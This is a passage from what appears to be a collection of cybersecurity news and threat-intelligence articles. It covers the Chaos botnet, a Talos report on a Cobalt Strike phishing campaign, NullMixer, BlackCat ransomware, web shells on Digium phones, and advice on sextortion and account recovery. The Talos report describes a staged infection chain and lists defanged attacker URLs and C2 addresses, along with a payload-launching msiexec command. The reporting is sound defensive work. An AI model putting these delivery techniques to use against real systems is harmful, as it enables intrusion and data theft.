malware does not, enabling it to operate across a wide range of instruction set architectures from ARM, Intel (i386), MIPS, and PowerPC, effectively allowing the threat actor to broaden the scope of its targets and swiftly accrue in volume. On top of that, Chaos further has the ability to execute as many as 70 different commands sent from the C2 server, one of which is an instruction to trigger the exploitation of publicly-disclosed flaws ( CVE-2017-17215 and CVE-2022-30525 ) defined in a file. An analysis of around 100 samples discovered in the wild dates the earliest evidence of the botnet activity to April 2022. The malware has since been observed targeting not only enterprise servers and large organizations but also devices that are not regularly monitored, such as SOHO routers and FreeBSD OS. Chaos is also believed to be an evolution of another Go-based DDoS malware named Kaiji that has previously targeted misconfigured Docker instances . The correlations, per Black Lotus Labs, stem from overlapping code and functions, counting that of a reverse shell module that makes it possible to run arbitrary commands on an infected device. A GitLab server located in Europe was one among the victims of the Chaos botnet in the first weeks of September, the company said, adding it identified a string of DDoS attacks aimed at entities spanning gaming, financial services, and technology, media and entertainment, and hosting providers. Also targeted was a crypto mining exchange. The findings come exactly three months after the cybersecurity company exposed a new remote access trojan dubbed ZuoRAT that has been singling out SOHO routers as part of a sophisticated campaign directed against North American and European networks. ""We are seeing a complex malware that has quadrupled in size in just two months, and it is well-positioned to continue accelerating,"" said Mark Dehus, director of threat intelligence for Lumen Black Lotus Labs.

""This campaign features enhancements and a shift toward LNK (Windows shortcut) files when compared to similar attacks in the past,"" Zscaler ThreatLabz researchers Niraj Shivtarkar and Avinash Kumar said in a Tuesday write-up. Sold on the dark web for €189 a month, Quantum Builder is a customizable tool for generating malicious shortcut files as well as HTA, ISO, and PowerShell payloads to deliver next-stage malware on the targeted machines, in this case Agent Tesla . The multi-stage attack chain starts with a spear-phishing email containing a GZIP archive attachment that includes a shortcut designed to execute PowerShell code responsible for launching a remote HTML application (HTA) using MSHTA . The phishing emails purport to be an order confirmation message from a Chinese supplier of lump and rock sugar, with the LNK file masquerading as a PDF document. The HTA file, in turn, decrypts and executes another PowerShell loader script, which acts as a downloader for fetching the Agent Tesla malware and executing it with administrative privileges. In a second variant of the infection sequence, the GZIP archive is replaced by a ZIP file, while also adopting further obfuscation strategies to camouflage the malicious activity. Quantum Builder has witnessed a surge in usage in recent months, with threat actors using it to distribute a variety of malware, such as RedLine Stealer, IcedID, GuLoader, RemcosRAT, and AsyncRAT. ""Threat actors are continuously evolving their tactics and making use of malware builders sold on the cybercrime marketplace,"" the researchers said.

It helped kids stay in touch with each other during the dark days of pandemic-era lockdowns. And now that the world is opening up again, the allure of the digital world remains undimmed. But the online world also exposes children to dangers that their parents never encountered when they were young. For example, recent years have seen an alarming rise in sextortion cases, including those targeting teens . In 2021, the FBI claimed to have recorded over 16,000 complaints in the first seven months of the year alone. Many more victims may be too ashamed to come forward. It’s time parents and caregivers wised up to the risks facing their kids online, and learned some best practice tips for mitigating them. As the name suggests, sextortion is a kind of blackmail where a threat actor tricks or coerces a victim into sharing sexually explicit images or videos of themselves and then threatens to release the material unless the victim either pays them or agrees to send more such photos or videos. This crime is not to be confused with sextortion scams , where threat actors send emails claiming to have installed malware on the victim’s computer that allegedly enabled them to record the individual watching pornography. They include personal details such as an old email password obtained from a historic data breach in order to make the threat – almost always an idle one – seem more realistic. The sextortion scam email phenomenon arose from increased public awareness of sextortion itself, with cryptocurrencies allowing an easy and somewhat anonymous payment method. In recent months, the FBI has issued multiple warnings of an increase in sextortion cases where victims have been befriended online by individuals masking their true identity before being tricked into sending explicit images or videos of themselves to the crooks. The victims then faced demands for more such material (or more money) or else the content would be released to the victim’s friends and family. #StopSextortion Say NO to: 🚫Sending compromising photos 🚫Moving conversations to other platforms 🚫Online threats or blackmail attempts Say YES to: ✅Talking with your kids/friends about #sextortion ✅Reporting suspicious behavior https://t.co/OkfB24fcMi Hear from SSA Ferron: pic.twitter.com/gzFDfhY4kr — FBI Baltimore (@FBIBaltimore) August 30, 2022 Worryingly, children and young adults are increasingly the target for sextortion attacks – they are more credulous and therefore easier for attackers to trick. And in many cases, the latter want specifically to obtain compromising images of youngsters for their own gratification. It’s a threat that can target both sexes. While there are many examples of prolific extortionists targeting girls, the FBI also warned recently of a steep increase in sextortion incidents targeting teenage boys . It goes without saying that the prospect of having nude images or videos circulated to friends and family can cause severe emotional and mental trauma for the victims. Children caught up in attacks are often too ashamed or afraid to seek help from friends, parents or teachers. They might try to accede to the extorter’s request, only to dig themselves a deeper hole as the attacker demands more photos or money. Unfortunately, these incidents can in some cases end tragically: Such incidents will horrify most parents. But as tempting as it is to try and restrict internet usage or access to specific sites, creating an atmosphere at home of honesty and mutual trust will be more effective in the long run. RELATED READING: What’s your attitude to parental controls? Parents and caregivers need to first understand the dangers themselves, and then share their insight in a non-judgemental way with their kids. Two-way communication is essential. Youngsters need to feel like they can come to their parents for help if they get embroiled in a sextortion case. If that’s the case, here’s a short list of best practice steps to work through with your child: The good news is that if the extorter has tried to share the content online, most reputable social media sites will have policies to take it down. And police action is having an impact. Just weeks ago, Interpol scored a win when it dismantled a sextortion ring that had made an estimated US$43,000 out of its victims in Asia. Yet prevention is always the best course of action here. While most sextortion threats today involve social engineering rather than information stealing malware, it pays to take steps to mitigate the threat from both. To help protect your child, chat to them about the danger and about the simple steps they can take to keep clear of it. They include basics like: At the same time, it’s never a bad time to consider reminding them of the importance of using strong and unique passwords , using reputable security software, and avoiding to click on links or download attachments in unsolicited messages.

Anyone can access it to share their code with practically anyone interested. Unfortunately, not every GitHub user is trustworthy. It has, in fact, been used to host malware at least a couple of times. In March 2018, for instance, cybercriminals hosted cryptocurrency mining malware on GitHub. More recently, a researcher reportedly used the repository to host several malicious projects . WhoisXML API threat researcher Dancho Danchev took a closer look at one such campaign using six domains and subdomains as jump-off points. Danchev’s findings led to the discovery of: A sample of the additional artifacts obtained from our analysis is available for download from our website . Publicly available reports revealed six web properties as IoCs—ovzl[.]jl9544519[.]pr46m[.]vps[.]myjino[.]ru, ovz1[.]9147167707[.]1xdez[.]vps[.]myjino[.]ru, myjino[.]ru, kolobkoproms[.]ug, m[.]ancard[.]ru, and reshenie2014[.]ru. We used these as the starting point for our in-depth investigation. Screenshot lookups for these pages showed that three of them continue to host live albeit insconpiscous content. Note the similarity between their content, though. They all seem to be pointing to myjino[.]ru. A bulk WHOIS lookup for the web properties identified as IoCs revealed that all of them were bulk-registered in the U.S. on 5 October 2011, with R01-RU as their registrar. DNS lookups for the domains and subdomains showed that they resolved to 92 unique IP addresses, all geolocated in Russia and managed by Internet service provider (ISP) JSC RTComm.RU. Given that WHOIS and DNS records all point to Russia, could the perpetrators be based there? According to malware checks on Threat Intelligence Platform (TIP) , four of the IP address resolutions—195[.]161[.]62[.]100, 81[.]177[.]139[.]113, 81[.]177[.]141[.]241, and 81[.]177[.]135[.]89—were dubbed “malicious” by various malware engines. To find more possibly connected artifacts, we used the IP addresses as reverse IP lookup search terms. That led to the discovery of 307 additional domains, 14 of which were tagged “malware hosts” based on a bulk TIP malware check. These properties were: We also looked for additional domains via Domains & Subdomains Discovery using the strings “myjino,” “kolobkoproms,” “ancard,” and “reshenie2014” as search terms. That uncovered 18 domains. We limited the domains to those with the exact terms but different TLD extensions. Of these, one—ancard[.]cn—was malicious. While GitHub has been employing stricter rules to avoid hosting malware since 2021 , cyber attackers are always on the lookout for ways to bypass security measures.

635124c628e9d467ce42839c,ciscotalos,https://blog.talosintelligence.com/2022/09/new-campaign-uses-government-union.html,"New campaign uses government, union-themed lures to deliver Cobalt Strike beacons",Chetan Raghuprasad,2022-09-28,"By Chetan Raghuprasad and Vanja Svajcer . Cisco Talos discovered a malicious campaign in August 2022 delivering Cobalt Strike beacons that could be used in later, follow-on attacks. Lure themes in the phishing documents in this campaign are related to the job details of a government organization in the United States and a trade union in New Zealand. The attack involves a multistage and modular infection chain with fileless, malicious scripts. Cisco Talos recently discovered a malicious campaign with a modularised attack technique to deliver Cobalt Strike beacons on infected endpoints. The initial vector of this attack is a phishing email with a malicious Microsoft Word document attachment containing an exploit that attempts to exploit the vulnerability CVE-2017-0199 , a remote code execution issue in Microsoft Office. If a victim opens the maldoc, it downloads a malicious Word document template hosted on an attacker-controlled Bitbucket repository. Talos discovered two attack methodologies employed by the attacker in this campaign: One in which the downloaded DOTM template executes an embedded malicious Visual Basic script, which leads to the generation and execution of other obfuscated VB and PowerShell scripts and another that involves the malicious VB downloading and running a Windows executable that executes malicious PowerShell commands to download and implant the payload. The payload discovered is a leaked version of a Cobalt Strike beacon. The beacon configuration contains commands to perform targeted process injection of arbitrary binaries and has a high reputation domain configured, exhibiting the redirection technique to masquerade the beacon's traffic. Although the payload discovered in this campaign is a Cobalt Strike beacon, Talos also observed usage of the Redline information-stealer and Amadey botnet executables as payloads. This campaign is a typical example of a threat actor using the technique of generating and executing malicious scripts in the victim's system memory. Defenders should implement behavioral protection capabilities in the organization's defense to effectively protect them against fileless threats. Organizations should be constantly vigilant on the Cobalt Strike beacons and implement layered defense capabilities to thwart the attacker's attempts in the earlier stage of the attack's infection chain. Initial vector The initial infection email is themed to entice the recipient to review the attached Word document and provide some of their personal information. Initial malicious email message. The maldocs have lures containing text related to the collection of personally identifiable information (PII) which is used to determine the eligibility of the job applicant for employment with U.S. federal government contractors and their alleged enrollment status in the government's life insurance program. The text in the maldoc resembles the contents of a declaration form of the U.S. Office of Personnel Management (OPM) which serves as the chief human resources agency and personnel policy manager for the U.S. federal government. Contents of maldoc sample 1. Another maldoc of the same campaign contains a job description advertising for roles related to delegating development, PSA plus — a prominent New Zealand trade union — and administrative support for National Secretaries at the Public Service Association office based out of Wellington, New Zealand. The contents of this maldoc lure resemble the legitimate job description documents for the New Zealand Public Service Association, another workers' union for New Zealand federal employees, headquartered in Wellington. Contents of maldoc sample 2. PSA New Zealand released this legitimate job description document in April 2022. The threat actor constructed the maldoc to contain the text lures to make it appear as a legitimate document on May 6, 2022. Talos' observation shows that the threat actors are also regular consumers of online news. Attack methodologies Attack methodologies employed by the actor in this campaign are highly modularised and have multiple stages in the infection chain. Talos discovered two different attack methodologies of this campaign with a few variations in the TTPs', while the initial infection vector, use of remote template injection technique and the final payload remained the same. Method 1 This is a modularised method with multiple stages in the infection chain to implant a Cobalt Strike beacon, as outlined below: Summary of attack method 1 infection chain. Stage 1 maldoc: DOTM template The malicious Word document contains an embedded URL, https[://]bitbucket[.]org/atlasover/atlassiancore/downloads/EmmaJardi.dotm, within its relationship component ""word/_rels/settings.xml.rels"". When a victim opens the document, the malicious DOTM file is downloaded. Contents of settings.xml.rels of maldoc. Stage 2: VBA dropper The downloaded DOTM executes the malicious Visual Basic for Applications (VBA) macro. The VBA dropper code contains an encoded data blob which is decoded and written into an HTA file, ""example.hta,"" in the user profile local application temporary folder. The decoded content written to an HTA file is the next VB script, which is executed using the ShellExecuted method. Stage 2 VBA dropper. Stage 3 VB script The third-stage VBS structure is similar to that of the stage 2 VB dropper. An array of the encoded data will be decoded to a PowerShell script, which is generated in the victim's system memory and executed. Stage 3 VB script. Stage 4 PowerShell script The PowerShell dropper script executed in the victim's system memory contains an AES-encrypted data blob as a base64-encoded string and another base64-encoded string of a decryption key. The encoded strings are converted to generate the AES encrypted data block and the 256-bit AES decryption key. Using the decryption key, the encrypted data generates a PowerShell downloader script, which is executed using the PowerShell IEX function. Stage 4 PowerShell script. Stage 5 PowerShell downloader The PowerShell downloader script is obfuscated and contains encoded blocks that are decoded to generate the download URL, file execution path and file extensions. The following actions are performed by the script upon its execution in victim's system memory: The script downloads the payload from the actor controlled remote location through the URL ""https[://]bitbucket[.]org/atlasover/atlassiancore/downloads/newmodeler.dll"" to the user profile local application temporary folder. The script performs a check on the file extension of the downloaded payload file. If the payload has the extension .dll, the script will run the DLL using rundll32.exe exhibiting the use of sideloading technique. If the payload has an MSI file extension, the payload is executed using the command ""msiexec /quiet /i <payload>"". If the payload is an EXE file, then it will run it as a process using the PowerShell commandlet Start-Process. Upon running the payload, the script will hide the payload file to establish persistence by setting the ""hidden"" file system attribute of the payload file. During our analysis, we discovered that the downloaded payload is a Cobalt Strike DLL beacon. Stage 5 PowerShell downloader. Method 2 The second attack method of this campaign is also modular, but is using less sophisticated Visual Basic and PowerShell scripts. We spotted that, in the attack chain, the actor employed a 64-bit Windows executable downloader which executes the PowerShell commands responsible for downloading and running the Cobalt Strike payload. Summary of attack method 2 infection chain. Stage 1 maldoc: DOTM template When a victim opens the malicious document, Windows attempts to download a malicious remote DOTM template through the URL ""https[://]bitbucket[.]org/clouchfair/oneproject/downloads/ww.dotm,"" which was embedded in its relationship component of the file settings.xml.rels."" Contents of settings.xml.rels of maldoc. Stage 2 VB script The DOTM template contains a VBA macro that executes a function to decode an encoded data block of the macro to generate the PowerShell downloader script and execute it with the shell function. Stage 2 VB script. Stage 3 PowerShell downloader The PowerShell downloader command downloads a 64-bit Windows executable and runs it as a process in the victim's machine. Stage 3 PowerShell downloader. Stage 4 downloader executable The downloader is a 64-bit executable that runs as a process in the victim's environment. It executes the PowerShell command, which downloads the Cobalt Strike payload DLL through the URL ""https[://]bitbucket[.]org/clouchfair/oneproject/downloads/strymon.png"" to the userprofile local application temporary directory with a spoofed extension .png and sideloads the DLL using rundll32.exe. Stage 4 downloader EXE. The downloader also executes the ping command to the IP address 1[.]1[.]1[.]1 and executes the delete command to delete itself. The usage of ping command is to instill a delay before deleting the downloader. Payload Talos discovered that the final payload of this campaign is a Cobalt Strike beacon. Cobalt Strike is a modularised attack framework and is customizable. Threat actors can add or remove features according to their malicious intentions. Employing Cobalt Strike beacons in the attacks' infection chain allows the attackers to blend their malicious traffic with legitimate traffic and evade network detections. Also, with its capabilities to configure commands in the beacon configuration, the attacker can perform various malicious operations such as injecting other malicious binary into the running processes of the infected machines and can avoid having a separate injection module implants in their infection chain. The Cobalt Strike beacon configurations of this campaign showed us various characteristics of the beacon binary: C2 server. Communication protocols. Process injection techniques. Malleable C2 Instructions. Target process to spawn for x86 and x64 processes. Watermark : ""Xi54kA=="". Cobalt Strike beacon configuration sample. The Cobalt Strike beacon used in this campaign has the following capabilities: Executes arbitrary codes in the target processes through process injection. Target processes described in the beacon configuration related to this campaign include: x86: ""%windir%\syswow64\dns-sd.exe"" ""%windir%\syswow64\rundll32.exe"" ""%windir%\syswow64\dllhost.exe -o enable"" x64: ""%windir%\sysnative\getmac.exe /V"" ""%windir%\sysnative\rundll32.exe"" ""%windir%\sysnative\DeviceParingWizard.exe"" A high-reputation domain defined in the HostHeader component of the beacon configuration. The actor is using this redirector technique to make the beacon traffic appear legitimate and avoid detection. Malicious repository The attacker in this campaign has hosted malicious DOTM templates and Cobalt Strike DLLs on Bitbucket using different accounts. We spotted two attacker-controlled accounts ""atlasover"" and ""clouchfair"" in this campaign: https[://]bitbucket[.]org/atlasover/atlassiancore/downloads and https[://]bitbucket[.]org/clouchfair/oneproject/downloads. During our analysis, the account ""atlasover"" was live and showed us the hosting information of some of the malicious files in this campaign. Attacker-controlled bitbucket repository. Talos also discovered in VirusTotal that the attacker operated the Bitbucket account ""clouchfair,"" using the account to host two other information stealer executables, Redline and Amadey, along with a malicious DOTM template and Cobalt Strike DLL. Command and control Talos discovered the C2 server operated in this campaign with the IP address 185[.]225[.]73[.]238 running on Ubuntu Linux version 18.04, located in the Netherlands and is a part of the Alibaba cloud infrastructure. Shodan search results showed us that the C2 server contained two self-signed SSL certificates with the serial numbers 6532815796879806872 and 1657766544761773100, which are valid from July 14, 2022 - July 14, 2023. SSL certificate associated with the C2 servers. Pivoting on the SSL certificates disclosed another Cobalt Strike C2 server with the IP address 43[.]154[.]175[.]230 running on Ubuntu Linux version 18.04 located in Hong Kong, which is also part of Alibaba cloud infrastructure and more likely is operated by the same actor of this campaign.

Excerpted with permission – access the full article here ). With GCHQ’s recent warning that voting was subject to a cyberattack, what can we do to avoid manipulation of the democratic process? It is a worrying time for many of us amid global inflation, rising living costs, and the ongoing energy crisis. On top of this, the recent change in U.K. government leadership has been cause for further uncertainty, which is true not only from a societal and economic perspective but also from a security perspective – with Government Communications Headquarters (GCHQ) warning that the voting process was subject to attack . Persistent malicious activity from hostile states and previous attacks on democratic elections show that prevention is always the best cure. This is because if it can be hacked, it will be. It is guaranteed that malicious groups would consider manipulating votes in pursuit of their own gain. Fortunately, vigilance from GCHQ prevented a cyberattack in the recent Tory leadership election, but this would not have been possible without secure protocols that are vital for spotting attacks. The fact that China, Russia, and Iran have previously been accused of attempting to influence polls further highlights the security dangers against not only democratic elections, but also political leaders and government organizations more broadly. So, with new leadership now in place, what lessons can be learned from this democratic process ? What can be done to limit cyberattackers’ influence on the democratic process ? While cybersecurity protocol is crucial for workers in the public and private sectors alike, it is vital for political operatives, candidates, and elected officials. After all, politicians and their employees are attractive targets because they have access to sensitive information and significant individuals, including high-profile funders. Political actors are also easy targets due to their behavior. These individuals are often highly ambulant, operating in hectic environments and working under continuous stress. They are compelled to make quick decisions, often while on the move, and communicate through smartphones with small interfaces, making minute anomalies difficult to detect. However, this is where candidates and staff can fall victim to social engineering “muscle memory” attacks, which exploit our reliance on routine actions (responding to email login requests without a second thought, for example) and our inability to effectively multi-task. Given that these individuals are targets for both state-sponsored and financially-motivated attacks, it is imperative that government organizations and their employees know how to move quickly and decisively to secure these primary forms of communication. Securing the Democratic Process Requires Speedy Action To defend against unauthorized influence, government organizations should adopt both the right technologies and the right attitudes. By securing every hackable endpoint, exercising zero trust across systems and processes like ballots, and ensuring that every security protocol – however basic – is enforced, will remove any security blind spots. The implementation and enforcement of Domain-based Message Authentication, Reporting & Conformance (DMARC) protocols is also essential, including extending efforts to multi-factor authentication (MFA) and enterprise-grade messaging platforms. Combined, these help to prevent unauthorized email access and electronic eavesdropping, while encouraging the detection of phishing and other social engineering emails. Most importantly, government organizations should deploy AI-driven predictive threat detection to stay in front of the sophisticated cyberattacks inbound from state-sponsored groups. Prevent, Secure, Succeed States cannot choose when they will have to fight a cyber battle – unfortunately, it is out of our control. Therefore, today’s leaders and government organizations must be ready to respond with effective secure cyber protocols, particularly Domain-based Message Authentication, Reporting & Conformance (DMARC) email security given the fast-paced nature of these organizations and individuals. While security is important for both public and private sector professionals, it is even more critical in the political sphere – with failure to act quickly posing a direct threat to democracy itself.

""When a user extracts and executes NullMixer, it drops a number of malware files to the compromised machine,"" cybersecurity firm Kaspersky said in a Monday report. ""It drops a wide variety of malicious binaries to infect the machine with, such as backdoors, bankers, downloaders, spyware, and many others."" Besides siphoning users' credentials, address, credit card data, cryptocurrencies, and even Facebook and Amazon account session cookies, what makes NullMixer insidious is its ability to download dozens of trojans at once, significantly widening the scale of the infections. Attack chains typically start when a user attempts to download cracked software from one of the sites, which leads to a password-protected archive that contains an executable file that, for its part, drops and launches a second setup binary designed to deliver an array of malicious files. These malicious websites leverage search engine optimization (SEO) poisoning techniques such as keyword stuffing to feature them highly in search engine results. Similar tactics have been adopted by actors behind GootLoader and SolarMarker campaigns. NullMixer, last month, was linked to the distribution of a rogue Google Chrome extension called FB Stealer , which is capable of Facebook credential theft and search engine substitution. Some of the other prominent malware families distributed by the dropper include DanaBot and a raft of information-stealing malware such as ColdStealer , PseudoManuscrypt , Raccoon Stealer , Redline Stealer , and Vidar . Also deployed using NullMixer are trojan downloaders like FormatLoader, GCleaner, LegionLoader (aka Satacom), LgoogLoader, PrivateLoader , SgnitLoader, ShortLoader, and SmokeLoader , as well as the C-Joker cryptocurrency wallet stealer. Kaspersky said it blocked attempts to infect more than 47,778 victims worldwide, with a majority of the users located in Brazil, India, Russia, Italy, Germany, France, Egypt, Turkey, and the U.S. The threat actor operating NullMixer has not been attributed to a known group. The latest findings are yet another indication that malware and unwanted applications are being increasingly propagated via pirated software. It's also recommended to check online accounts regularly for unknown transactions. ""Any download of files from untrustworthy resources is a real game of roulette: you never know when it will fire, and which threat you will get this time,"" Kaspersky researcher Haim Zigel said .

In 2021, BBC announced something unprecedented : “ a coordinated cyberattack has struck multiple UK-based providers of voice over internet protocol (VoIP) services, according to an industry body via DDoS attack s.” More recently, cybersecurity experts from Palo Alto published a study focused on Digium Phone Software. In detail, these VoIP devices are vulnerable to CVE-2021-45461 , and criminals are taking advantage of them to drop a web shell on the servers in a large and massive global campaign with the goal of exfiltrating internal data and taking control of internal networks. Modus operandi The scripts and how the attack was conducted share similarities with the INJ3CTOR3 campaign reported by Check Point in November 2020, potentially a new wave from the previous attacks. From a total of 500,000 analyzed samples by Palo Alto, two clusters were created, representing different payloads dropping a final web shell. As observed in Figure 1, payload 2 (highlighted as Group 2) is more significant than payload 1, presenting 70% of the collected samples. Figure 1: Cluster of different payloads observed in this campaign. Group 2 contains 70% of the collected samples ( source ). The different payloads and source codes are presented below. Figure 2: Source code of variants 1 (above) and 2 (below). The power of a web shell script The initial script observed in Figure 2 installs an obfuscated PHP web sell on the server side, downloads additional scripts, and schedules daily tasks to re-infect the target machine. Palo Alto provides the high-level diagram of this campaign with the following schema. Figure 3: High-level diagram of Digium Phones cyberattack via web shell ( source ). Implanting a web shell in a server is very powerful, as criminals typically can create persistence and stay invisible for an extended period. This is, in fact, an advantage of using web shells, and merging it with the legitimate source code is hard to detect. With this tactic in place, escalating privileges and maintaining a solid foothold on the internal network is the most dangerous point from the security point of view. A web shell allows internal enumeration via the legitimate web server. Criminals can create internal tunnels, open reverse connections, perform enumeration and deploy additional payloads (e.g., CobaltStrike beacons) as well. Digium phones are under attack The usage of web shells is not new, and criminals typically use this tactic as its detection is hard when the implant is well-merged on the source code level. Within this context, monitoring should be a rule of thumb as web shells can be detected early, for instance, by analyzing or creating specific rules for unusual or abnormal traffic. On the other hand, continuous integration and code analysis approaches are also vital in this field, as detecting discrepancies at the source-code level and catching malicious implants could be performed effectively.

Don’t panic – here’s how to get your account back and how to avoid getting hacked (again) A friend – let’s call her Ellie – recently called me with a devastated tone in her voice. Her Instagram account had been hacked and she was locked out. Her panic was evident as she told me her password had been changed and that the hackers had added two-factor authentication (2FA) to the account. She went on to ask me if I knew of any tips to regain control. I had heard of both good and bad outcomes in similar situations, online, but I had never attempted it first-hand. If I’m honest, I was actually a little excited at the opportunity to test Instagram’s recovery methods to see if I could learn anything. Ellie is quite computer savvy and understands technology; however, she is also very busy with her small business and young children. As a result, she has simply “put off” adding extra security layers to her social media and email accounts. At any rate, when she called, I refrained from “I told you so!” and asked her what had happened. Ellie’s first mistake was that she had used a relatively simple password on the account and had reused it on other accounts , so this password was either compromised or attacked via brute force to gain illicit entry. Her second mistake was that her account was not to set up 2FA, which is free and easy to implement in all social media and email accounts. With this turned on, the hackers would have simply been turned away – even with entering the right password or clicking on the “forgotten password” link (a hacker’s favorite starting block!). Once into her account, they started the process of locking Ellie out by changing the password, adding 2FA to a Nigerian phone number and a different email address. Also, they added an authenticator app. Additionally, they even added some numbers to the end of the Instagram username, which, at first, I could not work out why. This is presumably done so Ellie would not simply be able to regain control from her phone, should she get that far. Once they had locked Ellie out, they started the next level of sideways attacks by sending messages to her Instagram friends, presumably to target their accounts and get their 2FA codes and multiply the hack. Luckily, no one else divulged the code but a few were immediately taken in by the messages. When Ellie tried to recover her account, she felt like she was at a dead end – even after following the steps on the Instagram help site , she felt stuck. When she requested a login link from Instagram to be sent to her primary email address, nothing genuine came through even though she could still access this account. (You will, of course, need access to the email address connected to your account. If for any reason you cannot access this email account, Instagram will not let you regain access to your Instagram profile.] I had remembered that hackers can often get into the associated emails via the same reused passcode, and then hide or block recovery emails sent from Instagram regarding the hacked accounts. To my (relative) shock, this was exactly what had happened. In her Yahoo account, she clicked on the “Blocked List” and three email addresses ending in mail.instagram.com had been blocked. Once unblocked, she followed the process again and Instagram sent another login link. She was then asked to submit a video selfie to help verify her identity (this was only possible as she has photos of herself on the account). RELATED READING: Attack of the Instagram clones Within 20 minutes, she received an email saying that she had now been granted access back into the account and given a small number of one-time recovery codes to use. We both thought we were on the road to victory! But it was short-lived. Although Ellie did regain access to the account by following the genuine link and typing in a backup code, the strangest thing is that she was instantly booted straight back out on entry. She retried this process five more times and this frustrating cycle reoccurred. She panicked, as she was only given six backup codes to use. To get more codes, she had to prove her identity again via the video selfie process … which did not work the next time, but after another attempt she passed and was given six more codes. Interestingly, however, Ellie’s email address started receiving emails purporting to be from Instagram but the grammar errors and strange requests for security codes looked phishy and, luckily, she ignored them. Presumably they could have locked her out of this account, but they wanted to keep her in to potentially hand over the One Time Passcodes (OTPs). I wondered if there could be a problem with her geo- or network location, or device, potentially banning her from entering the account, so I asked her to send the recovery email to my email address for me to try from my laptop at a location five miles away. I attempted the process on my laptop and much to her disbelief, I got in straight away and stayed in! Success! Ellie was overjoyed, but before I took a moment to work out why this attempt had worked, I decided to secure the account once and for all. I turned off the newly assigned 2FA app and the Nigerian phone number the hackers had changed it to; then, I changed the associated phone number to Ellie’s and then turned 2FA back on. I went on to change the password and used a 2FA code sent to her phone via SMS to prove she was now the secure owner of the account. Another thing the bad guys did was change Ellie’s username. This is presumably because when you log back into Instagram from your phone after logging out, it locks the login screen to the previous username and not an email address, making re-entry very tough unless it is still the original username tied to the app. To get Ellie back in, I had to change it back to her original username. While in her account, I visited her “Login Activity” and it asked me if my current login location was “me”. I clicked “yes” and it stored this location. My presumption on how she was instantly being booted out of the account is one of two possibilities. Firstly, they had potentially looked at recent login activity and struck off those locations, making Instagram think her home Wi-Fi was in fact a hacker’s location. Or secondly, the hackers were still in the account and every time Ellie attempted to use the backup codes, they were notified and used their associated 2FA to change the password once again before she could press on any further. Either way, using another IP address from a laptop and navigating the site quickly worked. Once she was back in, Ellie had a lot of replying to do with all the messaging that the hackers had done. Fascinatingly, anyone who replied stating they thought Ellie’s account had been hacked, or mentioned on their own stories that Ellie’s account had been hacked, had been blocked by the hackers too! Luckily, the whole process only took three days but it definitely felt longer for Ellie. She is back in now and after nearly giving up, she mentioned that she has learnt about account protection the hard way. And I will leave it in her words: “I wish I had followed this simple security advice beforehand”. BEFORE YOU GO: SnapHack: Watch out for those who can hack into anyone’s Snapchat!

""Among some of the more notable developments has been the use of a new version of the Exmatter data exfiltration tool, and the use of Eamfo, information-stealing malware that is designed to steal credentials stored by Veeam backup software,"" researchers from Symantec said in a new report. BlackCat, also known by the names ALPHV and Noberus, is attributed to an adversary tracked as Coreid (aka FIN7 , Carbanak, or Carbon Spider) and is said to be a rebranded successor of DarkSide and BlackMatter , both of which shut shop last year following a string of high-profile attacks, including that of Colonial Pipeline. The threat actor, like other notorious ransomware groups, is known to run a ransomware-as-a-service (RaaS) operation, which involves its core developers enlisting the help of affiliates to carry out the attacks in exchange for a cut of the illicit proceeds. ALPHV is also one of the first ransomware strains to be programmed in Rust , a trend that has since been adopted by other families such as Hive and Luna in recent months to develop and distribute cross-platform malware. The evolution of the group's tactics, tools, and procedures (TTPs) comes more than three months after the cybercrime gang was discovered exploiting unpatched Microsoft Exchange servers as a conduit to deploy ransomware. Subsequent updates to its toolset have incorporated new encryption functionalities that enable the malware to reboot compromised Windows machines in safe mode to bypass security protections. ""In a July 2022 update the team added indexing of stolen data -- meaning its data leaks websites can be searched by keyword, file type, and more,"" the researchers said. The latest refinements concern Exmatter , a data exfiltration tool used by BlackCat in its ransomware attacks. Besides harvesting files only with a specific set of extensions, the revamped version generates a report of all processed files and even corrupts the files. Also deployed in the attack is an info-stealing malware called Eamfo that's designed to siphon credentials stored in the Veeam backup software and facilitate privilege escalation and lateral movement. The findings are yet another indication that ransomware groups are adept at continually adapting and refining their operations to remain effective as long as possible. ""Its continuous development also underlines the focus of the group on data theft and extortion, and the importance of this element of attacks to ransomware actors now,"" the researchers said. BlackCat has also been recently observed using the Emotet malware as an initial infection vector, not to mention witnessing an influx of new members from the now-defunct Conti ransomware group following the latter's withdrawal from the threat landscape this year. The sunsetting of Conti has also been accompanied by the emergence of a new ransomware family dubbed Monti , a ""doppelganger"" group which has been found purposefully and brazenly impersonating the Conti team's TTPs and its tools. News of BlackCat adding a revamped slate of tools to its attacks arrives as a developer associated with the LockBit 3.0 (aka LockBit Black) file-encrypting malware allegedly leaked the builder used to create bespoke versions, prompting concerns that it could lead to more widespread abuse by other less skilled actors. It's not just LockBit. Over the past two years, Babuk and Conti ransomware groups have suffered similar breaches, effectively lowering the barrier for entry and enabling malicious actors to quickly launch their own attacks.",['Malware'],247db7a8-f089-58eb-a9f7-1393e2adc903,"The BlackCat ransomware operators have been spotted fine-tuning their malware arsenal to fly under the radar and expand their reach.

Every organisation that needs to deliver services to their customers and employees must protect their IT 'network' - all the apps and connected devices from laptops and desktops to servers and smartphones. While traditionally, these would all live on one ""corporate network,"" - networks today are often just made up of the devices themselves, and how they're connected: across the internet, sometimes via VPNs, to the homes and cafes people work from, to the cloud and data centres where services live. So what threats does this modern network face? Let's look at them in more detail. According to recent research by Verizon , misconfiguration errors and misuse now make up 14% of breaches. Misconfiguration errors occur when configuring a system or application so that it's less secure. This can happen when you change a setting without fully understanding the consequences, or when an incorrect value is entered. Either can create a serious vulnerability - for example, a misconfigured firewall can allow unauthorized access to an internal network, or a wrongly configured web server could leak sensitive information. Software and app developers constantly release updates with patches to cover vulnerabilities that have been discovered in their code. Applying patches to fix these vulnerabilities across an organisation's entire network of devices can be time-consuming and complex to implement - but it is essential. If you don't update your software, firmware and operating systems to the latest versions as they're released, you're leaving your network exposed. A vulnerability scanner will give you a real-time inventory of all the software which needs updating, as well as detect misconfigurations that reduce your security, so you can stay as secure as possible. The previous two threats are usually exploited to breach networks and steal information, but a Denial-of-Service (DoS) attack is meant to shut down your network and make it inaccessible. This can be done by many means, either with malware, or by flooding the target network with traffic, or sending information that triggers a crash such as requesting overly complex queries that lock up a database. In each case, the DoS attack prevents customers or employees from using the service or resources they expect. DoS attacks often target websites of high-profile organisations such as banks, media companies and governments. Though DoS attacks don't usually result in the theft or loss of data, they can cost you a great deal of time and money to handle. A properly configured content delivery network (CDN) can help protect websites against DoS attacks and other common malicious attacks. A software bug is an error, flaw 